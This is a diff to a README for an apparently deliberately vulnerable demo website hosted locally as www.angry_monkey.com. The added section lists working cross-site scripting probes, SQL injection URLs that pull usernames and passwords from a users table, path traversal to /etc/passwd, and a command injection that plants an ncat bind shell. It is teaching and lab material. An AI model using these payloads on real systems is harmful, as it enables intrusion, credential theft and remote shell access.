@@ -111,5 +111,51 @@ Add the following lines to the bottom of the file
 127.0.0.1 www.angry_monkey.com
 ```
 
+You will also need ncat to exploit the Command Injection vuln. ncat is inside the nmap package in Ubuntu.
+```
+sudo apt-get install nmap
+```
+
 ####Go Have Fun
-You should now be able to open your web browser and go to www.angry_monkey.com
+You should now be able to open your web browser and go to [www.angry_monkey.com](www.angry_monkey.com)
+
+The following probes and commands are used during the demo to test and exploit the different vulnerabilities present on the website.
+
+**Cross-Site Scripting**
+```
+>'>"><owl>
+
+aaa
+1337
+<b>aaa
+<script>alert(1)</script>
+<script>alert(location.host)</script>
+```
+
+**SQL Injection**
+```
+')\
+
+curl www.angry_monkey.com/profiles/42\/antonio
+www.angry_monkey.com/profiles/42\/ OR 1 -- -
+www.angry_monkey.com/profiles/42\/%09OR%091--%09-
+
+www.angry_monkey.com/profiles/42\/%09UNION%09SELECT%091,2,3--%09-
+www.angry_monkey.com/profiles/42\/%09UNION%09SELECT%091,2,3,4--%09-
+
+curl "www.angry_monkey.com/profiles/42\/%09AND%09(SELECT%09*%09FROM%09(SELECT%09*%09FROM%09users%09JOIN%09users%09b%09using%09(id,us3rn4m3))%09a)--%09-"
+curl "www.angry_monkey.com/profiles/42\/%09AND%09(SELECT%09*%09FROM%09(SELECT%09*%09FROM%09users%09JOIN%09users%09b%09using%09(id,us3rn4m3,twitter))%09a)--%09-"
+
+curl "www.angry_monkey.com/profiles/42%5c/OR%09POLYGON((SELECT(1)FROM(SELECT(us3rn4m3),(PassW0rdColuMn)FROM(users)WHERE(id=42))x))--%09-"
+```
+
+**Command Injection**
+```
+/etc/passwd
+../../../../../../../etc/passwd
+;echo 111
+%26%26echo 111
+
+http://www.angry_monkey.com/index.php?doc=us.txt%26%26ncat -c sh -l -p 3333%26
+ncat www.angry_monkey.com 3333
+```
